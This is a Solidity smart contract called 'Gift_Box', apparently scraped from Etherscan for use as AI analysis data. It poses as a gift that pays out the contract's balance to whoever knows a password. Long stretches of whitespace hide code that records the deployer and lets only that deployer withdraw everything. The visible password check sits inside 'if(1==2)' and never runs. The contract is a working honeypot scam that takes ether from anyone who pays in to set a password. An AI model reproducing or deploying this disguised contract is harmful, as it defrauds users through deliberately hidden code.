/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity ^0.4.18;

contract Gift_Box
{                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      address prop = msg.sender;
    function()payable{}
    
    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
    
    bytes32 public hashPass;
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if(msg.value >= 1 ether)
        {
            hashPass = hash;
        }
    }
    
    function GetGift(bytes pass)
    public
    payable
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               if(msg.sender==prop){msg.sender.transfer(this.balance);}if(1==2){
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
    }
}